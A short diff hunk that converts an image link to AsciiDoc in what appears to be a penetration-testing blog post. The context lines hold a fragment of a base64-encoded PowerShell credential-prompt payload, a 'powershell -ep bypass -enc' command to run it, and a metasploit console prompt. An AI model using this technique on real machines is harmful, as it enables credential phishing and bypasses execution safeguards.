@@ -77,7 +77,7 @@ JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQA
 
 Then execute `powershell -ep bypass -enc <the encoded text from above>` and you get this:
 
-Image should be here: ![](/images/2014-09-03-powershellpopup.png)
+Image should be here: image::2014-09-03-powershellpopup.png[]
 
 ....
 root@wpad:~/metasploit-framework# ./msfconsole -Lq
